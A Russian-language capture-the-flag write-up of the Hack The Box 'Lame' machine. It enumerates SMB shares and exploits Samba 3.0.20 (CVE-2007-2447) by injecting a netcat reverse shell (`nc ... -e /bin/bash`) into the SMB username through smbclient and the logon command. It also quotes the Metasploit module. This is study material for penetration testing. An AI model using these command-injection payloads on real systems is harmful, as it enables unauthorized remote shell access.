# SMB

## Перечисление SMB-дочерних дисков

Сейчас давайте рассмотрим SMB. Сначала можно отобразить дочерние диски:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Принтеры и драйверы
	tmp                                               	READ, WRITE	oh noes!
	opt                                               	NO ACCESS	
	IPC$                                              	NO ACCESS/IPC-сервис (lame сервер (Samba 3.0.20-Debian))
	ADMIN$                                            	NO ACCESS/IPC-сервис (lame сервер (Samba 3.0.20-Debian))
```

Единственный диск, к которому можно подключиться, — это `tmp`. Попытка подключения выдаёт следующую ошибку:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Это связано с тем, что наша конфигурация настроена так, чтобы не подключаться к дочерним дискам старых версий SMB из соображений безопасности. Мы можем изменить конфигурацию в `/etc/samba.smb.conf` или передать параметр командной строки, чтобы не вносить небезопасные изменения в конфиг и не забыть их откатить:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon May  3 21:52:58 2021
  ..                                 DR        0  Sat Oct 31 06:33:58 2020
  .ICE-unix                          DH        0  Mon May  3 21:43:29 2021
  vmware-root                        DR        0  Mon May  3 21:43:51 2021
  .X11-unix                          DH        0  Mon May  3 21:43:54 2021
  .X0-lock                           HR       11  Mon May  3 21:43:54 2021
  vgauthsvclog.txt.0                  R     1600  Mon May  3 21:43:26 2021

		7282168 blocks of size 1024. 5386612 blocks available
```

В итоге в каталоге не было ничего интересного.

## Exploit SMB

Таким образом, вместо этого можно посмотреть номер версии в searchsploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ searchsploit Samba 3.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

...[snip]...

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                       | unix/remote/16320.rb

...[snip]...

Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                  | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                  | linux/remote/7701.txt

...[snip]...

----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Существует несколько exploits для версии, которую мы хотим использовать. Remote heap overflow не ясно, как должен выполняться, поэтому, хотя мы не хотим использовать Metasploit, я попытался посмотреть модуль, чтобы узнать, как он работает, используя `searchsploit -x unix/remote/16320.rb`.

Модуль Metasploit ссылается на [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447). Это, кажется, ключевой код:

```ruby
def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
				simple.client.negotiate(false)
				simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
				# nothing, it either worked or it didn't ;)
		end

		handler
end
```

Похоже, при автентификации с SMB необходимо передать полезную нагрузку (payload) в параметр имени пользователя. Давайте попробуем это сделать:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
nohup: ignoring input and redirecting stderr to stdout
```

Мы получаем попадание на наш слушатель! Но, странно, это исходит от нашего компьютера:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.14.13] 37426
```

Я поискал в интернете, и оказалось, что backticks \` выполняются bash до остальной команды ([согласно Stack Exchange](https://unix.stackexchange.com/questions/27428/what-does-backquote-backtick-mean-in-commands)). Это используется для замены команд внутри, где результат передаётся в bash.

Теперь я попробовал избежать backticks — мне также нужно было передать дополнительный параметр, так как возникала ошибка `NT_STATUS_CONNECTION_DISCONNECTED`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ smbclient //10.10.10.3/tmp -U "/=\`nohup nc 10.10.14.13 9001 -e /bin/bash\`" --option='client min protocol=NT1'
Enter =`NOHUP NC 10.10.14.13 9001 -E \bin/bash`'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

Это был потенциальный прогресс, так как команда больше не проверялась на моём компьютере — но мне также не выдавалась шелл.

Кажется, она начинала с заглавления команды. Я не знал, как это исправить, поэтому искал скрипт PoC.

## PoC

Поиск "CVE 2007 2447 poc" дал мне [этот exploit](https://0xdf.gitlab.io/2020/04/07/htb-lame.html). Я понял, что мог бы использовать альтернативную команду для входа в SMB после подключения и передать там полезную нагрузку:

```bash
smb: \> logon "./=`nohup nc 10.10.14.13 9001 -e /bin/bash`"
```

# Tags

#writeup #oscp-prep #cve #smb 
